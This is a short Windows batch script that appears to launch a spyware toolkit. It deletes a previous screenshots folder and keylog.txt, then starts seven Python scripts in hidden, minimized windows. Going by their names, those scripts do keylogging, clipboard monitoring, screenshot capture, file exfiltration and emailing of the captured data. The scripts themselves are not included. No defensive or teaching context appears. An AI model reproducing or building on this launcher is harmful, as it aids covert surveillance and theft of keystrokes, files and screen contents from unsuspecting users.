@echo off

REM Remove the screenshots folder and keylog.txt file
if exist "screenshots" (
    rmdir /s /q "screenshots"
    echo Screenshots folder removed.
) else (
    echo Screenshots folder not found.
)

if exist "keylog.txt" (
    del /q "keylog.txt"
    echo keylog.txt removed.
) else (
    echo keylog.txt not found.
)


REM Run all Python scripts without opening visible windows and exclude .bat files
start /min pythonw clipboard_monitor.py
start /min pythonw file_exfiltration.py
start /min pythonw files_mail.py
start /min pythonw keylogger_mail.py
start /min pythonw keylogger.py
start /min pythonw screenshot_capture.py
start /min pythonw screenshot_mail.py




